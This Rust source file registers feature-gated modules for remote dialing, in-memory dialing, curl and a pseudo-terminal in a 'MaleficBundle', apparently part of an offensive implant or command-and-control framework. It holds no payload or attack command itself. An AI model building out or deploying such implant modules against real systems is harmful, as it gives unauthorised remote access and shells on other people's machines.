mod prelude;

#[cfg(feature = "rem")]
mod rem;

#[cfg(feature = "curl")]
mod curl;

#[cfg(feature = "pty")]
mod pty;

use prelude::*;
use std::collections::HashMap;

pub extern "C" fn register_3rd() -> MaleficBundle {
    let mut map: MaleficBundle = HashMap::new();
    #[cfg(feature = "rem")]
    {
        register_module!(map, "rem_dial", rem::RemDial);
        register_module!(map, "memory_dial", rem::MemoryDial);
    }

    #[cfg(feature = "curl")]
    register_module!(map, "curl", curl::Curl);

    #[cfg(feature = "pty")]
    register_module!(map, "pty", pty::Pty);

    map
}

#[cfg(feature = "as_module_dll")]
malefic_module::register_rt_modules!(
    #[cfg(feature = "rem")] rem::RemDial,
    #[cfg(feature = "rem")] rem::MemoryDial,
    #[cfg(feature = "curl")] curl::Curl,
    #[cfg(feature = "pty")] pty::Pty
);
